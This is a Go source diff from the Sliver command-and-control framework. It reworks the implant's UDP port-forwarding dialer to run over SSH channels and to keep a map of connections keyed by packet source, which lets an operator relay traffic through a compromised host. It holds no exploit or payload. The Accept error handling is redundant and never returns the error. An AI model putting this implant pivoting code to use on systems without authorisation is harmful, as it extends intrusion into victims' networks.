@@ -24,98 +24,47 @@ import (
 	// {{end}}
 
 	"encoding/gob"
-	"errors"
 	"fmt"
 	"io"
 	"net"
 	"os"
+	"sync"
 	"time"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"golang.org/x/crypto/ssh"
+
+	"github.com/bishopfox/sliver/protobuf/commpb"
 )
-
-// func init() {
-//         gob.Register(&udpPacket{})
-// }
-
-// udpDialer - Any UDP handler started on an implant, no matter bind or reverse,
-// needs a UDP listener since UDP is connection-less. However, this udpListener
-// can both read from and write to a signle io.ReadWriteCloser, for the length of
-// time this handler is running, or timeouts if any are specified.
-type udpDialer struct {
-	hostPort string
-	stream   *udpStream
-	outbound *net.UDPConn
-}
-
-// newDialerUDP - Creates UDP handler that is connected to an addess:port on the
-// implant's host network. If specified, we dial with given source host:ports as well.
-func newDialerUDP(info *sliverpb.ConnectionInfo, stream *udpStream) (h *udpDialer, err error) {
-
-	// If source host:port, make UDP address. Rules are as following:
-	// If none, use nil laddr (OS will take care)
-	// If port and no addr, use 0.0.0.0:port
-	// If port and addr, use them both.
-	// If addr invalid, return and don't dial with OS-chosen source.
-	var laddr *net.UDPAddr
-	if info.LPort != 0 {
-		var ip net.IP
-		if info.LHost == "" {
-			ip = net.ParseIP("0.0.0.0")
-		} else {
-			ip = net.ParseIP(info.LHost)
-			if ip == nil {
-				return nil, fmt.Errorf("Could not parse source IP address: %s", info.LHost)
-			}
-		}
-		laddr = &net.UDPAddr{IP: ip, Port: int(info.LPort)}
-	}
-
-	// We need a destination address anyway.
-	ip := net.ParseIP(info.RHost)
-	if ip == nil {
-		return nil, errors.New("Invalid RHost IP address")
-	}
-	raddr := &net.UDPAddr{IP: ip, Port: int(info.RPort)}
-
-	// Get a UDP connection to the destination or return.
-	udpConn, err := net.DialUDP("udp", laddr, raddr)
-	if err != nil {
-		return nil, fmt.Errorf("failed to dial UDP address %s: %s", raddr.String(), err.Error())
-	}
-
-	// Handler with a working conn, and wired up to the Comms.
-	h = &udpDialer{
-		hostPort: fmt.Sprintf("%s:%d", info.LHost, info.LPort),
-		outbound: udpConn,
-		stream:   stream,
-	}
-
-	return
-}
 
 // DialUDP - The server is forwarding us some UDP packets, writes them on the
 // address:port socket, and read the response until some timeout.
 // NOTE: All packets coming from the stream have the same destination addess:port
 // so we only have one equivalent UDP connections to write the packets to.
-func DialUDP(info *sliverpb.ConnectionInfo, stream io.ReadWriteCloser) error {
-
-	// Create the UDP stream to wire the ReadWriteCloser and the UDP handler
-	udpStream := &udpStream{
-		r: gob.NewDecoder(stream),
-		w: gob.NewEncoder(stream),
-		c: stream,
-	}
+func DialUDP(info *commpb.Conn, ch ssh.NewChannel) error {
 
 	// Create the UDP handler: dials the destination UDP address.
-	handler, err := newDialerUDP(info, udpStream)
+	handler, err := newDialerUDP(info)
 	if err != nil {
 		return err
 	}
 
-	// Start processing packets from the host and route them back to the server
-	// (Names of function are indeed opposite to their udpListener counterparts)
-	go handler.handleRead()
+	// Accept stream and pipe
+	stream, reqs, err := ch.Accept()
+	if err != nil {
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
+			// {{end}}
+		}
+	}
+	go ssh.DiscardRequests(reqs)
+
+	// Create the UDP stream to wire the ReadWriteCloser and the UDP handler
+	handler.stream = &udpStream{
+		r: gob.NewDecoder(stream),
+		w: gob.NewEncoder(stream),
+		c: stream,
+	}
 
 	// Only then we write the data coming from the server,
 	// as we're ready to get the response.
@@ -124,18 +73,79 @@ func DialUDP(info *sliverpb.ConnectionInfo, stream io.ReadWriteCloser) error {
 	return nil
 }
 
+// udpDialer - An objet that dials a single UDP address and writes all its routed
+// traffic to it, no matter the src address of the packets. Therefore, this handler
+// is hardly ever used alone, except when we want to target specific addresses for
+// a specific connection, like routing a QUIC-transported implant.
+//
+// This handler should therefore not be used alone for pure UDP port forwarding.
+type udpDialer struct {
+	hostPort string
+	stream   *udpStream
+	outbound *udpConns
+}
+
+// newDialerUDP - Creates UDP handler that is connected to an addess:port on the
+// implant's host network. If specified, we dial with given source host:ports as well.
+func newDialerUDP(info *commpb.Conn) (h *udpDialer, err error) {
+
+	// Handler with a working conn, and wired up to the Comms.
+	h = &udpDialer{
+		hostPort: fmt.Sprintf("%s:%d", info.RHost, info.RPort),
+		outbound: &udpConns{
+			m: map[string]*udpConn{},
+		},
+	}
+
+	return
+}
+
+// handleWrite - Reads all packets forwarded by the server and write them to the UDP conn.
+func (h *udpDialer) handleWrite() error {
+	for {
+		// Decode a UDP packet
+		packet := &udpPacket{}
+		if err := h.stream.r.Decode(&packet); err != nil {
+			return err
+		}
+
+		// Dial the address or get the current UDP connection to it
+		conn, exists, err := h.outbound.dial(packet.Src, h.hostPort)
+		if err != nil {
+			return err
+		}
+		const maxConns = 100
+		if !exists {
+			if h.outbound.len() <= maxConns {
+				go h.handleRead(packet, conn)
+			} else {
+				// {{if .Config.Debug}}
+				log.Printf("exceeded max udp connections (%d)", maxConns)
+				// {{end}}
+			}
+		}
+		_, err = conn.Write(packet.Payload)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Done writing to UDP %s", h.hostPort)
+			// {{end}}
+			return err
+		}
+	}
+}
+
 // handleRead - Read all UDP packets coming at the host address:port
 // and route (encode) them back to the server.
-func (h *udpDialer) handleRead() error {
+func (h *udpDialer) handleRead(p *udpPacket, conn *udpConn) error {
 	const maxMTU = 9012
 	buff := make([]byte, maxMTU)
 	for {
 		//response must arrive within 15 seconds
 		deadline := 15 * time.Second
-		h.outbound.SetReadDeadline(time.Now().Add(deadline))
+		conn.SetReadDeadline(time.Now().Add(deadline))
 
 		//read response
-		n, src, err := h.outbound.ReadFromUDP(buff) // n, err := h.outbound.Read(buff)
+		n, err := conn.Read(buff) // n, err := h.outbound.Read(buff)
 		if err != nil {
 			if !os.IsTimeout(err) && err != io.EOF {
 				// {{if .Config.Debug}}
@@ -147,7 +157,7 @@ func (h *udpDialer) handleRead() error {
 		b := buff[:n]
 
 		//encode back over ssh connection
-		err = h.stream.encode(src.String(), b)
+		err = h.stream.encode(p.Src, b)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("encode error: %s", err)
@@ -158,19 +168,52 @@ func (h *udpDialer) handleRead() error {
 	return nil
 }
 
-// handleWrite - Reads all packets forwarded by the server and write them to the UDP conn.
-func (h *udpDialer) handleWrite() error {
-	for {
-		// Decode a UDP packet
-		packet := udpPacket{}
-		if err := h.stream.decode(&packet); err != nil {
-			return err
-		}
+type udpConns struct {
+	sync.Mutex
+	m map[string]*udpConn
+}
 
-		// Write it to the host UDP connection
-		_, err := h.outbound.Write(packet.Payload)
+func (cs *udpConns) dial(id, addr string) (*udpConn, bool, error) {
+	cs.Lock()
+	defer cs.Unlock()
+	conn, ok := cs.m[id]
+	if !ok {
+		c, err := net.Dial("udp", addr)
 		if err != nil {
-			return err
+			return nil, false, err
 		}
+		conn = &udpConn{
+			id:   id,
+			Conn: c,
+		}
+		cs.m[id] = conn
 	}
+	return conn, ok, nil
+}
+
+func (cs *udpConns) len() int {
+	cs.Lock()
+	l := len(cs.m)
+	cs.Unlock()
+	return l
+}
+
+func (cs *udpConns) remove(id string) {
+	cs.Lock()
+	delete(cs.m, id)
+	cs.Unlock()
+}
+
+func (cs *udpConns) closeAll() {
+	cs.Lock()
+	for id, conn := range cs.m {
+		conn.Close()
+		delete(cs.m, id)
+	}
+	cs.Unlock()
+}
+
+type udpConn struct {
+	id string
+	net.Conn
 }
